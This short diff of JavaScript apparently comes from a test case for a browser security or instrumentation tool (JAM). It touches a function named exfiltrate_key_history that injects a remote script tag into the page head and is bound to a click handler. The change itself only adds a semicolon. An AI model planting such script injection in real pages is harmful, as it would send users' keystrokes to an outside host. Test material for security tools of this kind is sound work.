@@ -6,6 +6,6 @@ function exfiltrate_key_history() {
   script.src = URL;
   var v1 = document.getElementsByTagName("head")[0];
   JAM.call(v1.appendChild, v1, [script]);
-  return
+  return;
 }
 JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
